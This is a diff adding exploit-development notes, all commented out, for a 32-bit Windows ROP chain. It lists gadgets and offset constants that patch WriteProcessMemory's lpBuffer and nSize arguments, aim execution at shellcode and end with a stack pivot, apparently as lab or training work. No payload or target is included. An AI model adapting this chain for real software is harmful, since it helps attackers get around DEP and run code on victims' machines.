@@ -1,0 +1,126 @@
+
+    # mov ebp, esp ; pop eax ; pop ecx ; dec eax ; ret  ;
+    # b"AAAA" 
+    # b"AAAA"
+    # clc  ; lea eax, dword [ebp-0x10] ; mov dword [fs:0x00000000], eax ; ret  ; 
+    
+
+    
+    # Add eax with 0x100000010 to overload 
+    # pop ecx ; ret  ;
+    # 0x12345678
+    # add eax, ecx ; ret  ;
+    # pop ecx ; ret  ;
+    # 0xedcba998
+    # add eax, ecx ; ret  ;
+
+
+    
+    # xchg eax, esi ; pop ebp ; ret  ;
+    # b"AAAA"
+    # mov ecx, esi ; ret  ;
+    # xor eax, eax ; ret  ;
+    # add eax, ecx ; ret  ;
+    
+
+
+    ### patch lpBuffer ###
+    # point esi to lpBuffer 
+    # pop ecx ; ret  ;
+    # 0x12345678
+    # add eax, ecx ; ret  ;
+    # pop ecx ; ret  ;
+    # 0xedcbaae8
+    # add eax, ecx ; ret  ;
+    # xchg eax, esi ; pop ebp ; ret  ;
+    # b"AAAA"
+
+    # pop ecx ; ret  ;
+    # 0xffffffec
+    # add eax, ecx ; ret  ;
+    # mov ecx, esi ; ret  ;
+    # mov dword [eax+0x04], ecx ; ret  ;
+
+
+
+    ### patch nSize ###
+    # xchg eax, esi ; pop ebp ; ret;
+    # b"AAAA" 
+    # pop ecx ; ret;
+    # 0x12345678
+    # xor eax, eax ; ret ;
+    # add eax, ecx ; ret ;
+    # pop ecx ; ret;
+    # 0xedcbad88
+    # add eax, ecx ; ret ;
+    # xchg eax, esi ; pop ebp ; ret;
+    # b"AAAA" 
+
+    # ppop ecx ; ret;
+    # 0x12345678
+    # add eax, ecx ; ret ;
+    # pop ecx ; ret;
+    # 0xedcba98c
+    # add eax, ecx ; ret ;
+    # mov ecx, esi ; ret  ;
+    # mov dword [eax+0x04], ecx ; ret  ;
+
+
+
+    ### patch WriteProcessMemory ###
+    # pop ecx ; ret  ;  offset:-40
+    # 0x88888888
+    # add eax, ecx ; ret  ;
+    # pop ecx ; ret  ;
+    # ecx = 0x77777764
+    # add eax, ecx ; ret  ;
+
+
+    # xchg eax, esi ; pop ebp ; ret ; (1 found)
+    # b"AAAA"
+    # xor eax, eax ; ret  ;  (1 found)
+    # pop ecx ; ret  ;
+    # 0x88888888
+    # add eax, ecx ; ret  ;
+    # pop ecx ; ret  ;
+    # 0xda87a798
+    # add eax, ecx ; ret  ;
+    # pop ecx ; ret  ;
+    # 0x3FCD3CFF
+    # add eax, ecx ; ret  ;
+
+
+    #mov ecx, esi ; ret  #esi to shellcode address
+    #add esi, dword [eax-0x3FCD3CFF] ; ret  ;  (1 found)
+
+
+   #xchg eax, esi ; pop ebp ; ret ; (1 found)
+    # b"AAAA"
+    # neg eax ; dec eax ; pop ebp ; ret  ;  (1 found)
+    # b"AAAA"  
+
+    #inc eax ; ret  ;  (1 found)
+    #add eax, ecx ; ret  ;
+    #neg eax ; dec eax ; pop ebp ; ret  ;  (1 found)
+    # b"AAAA"
+
+    #inc eax ; ret  ;  (1 found)
+    #xchg eax, esi ; pop ebp ; ret ; (1 found)
+    # b"AAAA"   #junk ebp
+    #xor eax, eax ; ret  ;  (1 found)
+    #add eax, ecx ; ret  ;
+    #mov ecx, esi ; ret 
+    #mov dword [eax+0x04], ecx ; ret  ;  (1 found)
+
+
+
+    # Aglin stack for WriteProcessMemory
+    # pop ecx ; ret  ;
+    # 0x12345678
+    # add eax, ecx ; ret  ;
+    # pop ecx ; ret  ;
+    # p32(0xedcba98c)
+# add eax, ecx ; ret  ;
+
+ # xchg eax, esp ; rol bl, 0xFFFFFFB8 ; cmp byte [esi+0x10], dl ; arpl bx, ax ; mov eax, 0x63105634 ; ret ;
+
